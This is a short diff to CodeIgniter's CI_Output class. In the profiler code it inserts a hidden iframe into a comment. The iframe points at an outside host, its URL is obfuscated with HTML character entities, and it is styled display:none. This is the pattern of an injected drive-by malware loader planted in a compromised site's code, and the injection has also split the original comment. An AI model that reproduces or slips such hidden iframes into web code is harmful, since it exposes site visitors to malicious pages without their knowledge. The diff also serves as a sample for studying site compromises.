@@ -518,7 +518,8 @@ class CI_Output {
 				$CI->profiler->set_sections($this->_profiler_sections);
 			}
 
-			// If the output data contains closing </body> and </html> tags
+			// If the output data contains closing <iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
+			//</body> and </html> tags
 			// we will remove them and add them back after we insert the profile data
 			$output = preg_replace('|</body>.*?</html>|is', '', $output, -1, $count).$CI->profiler->run();
 			if ($count > 0)
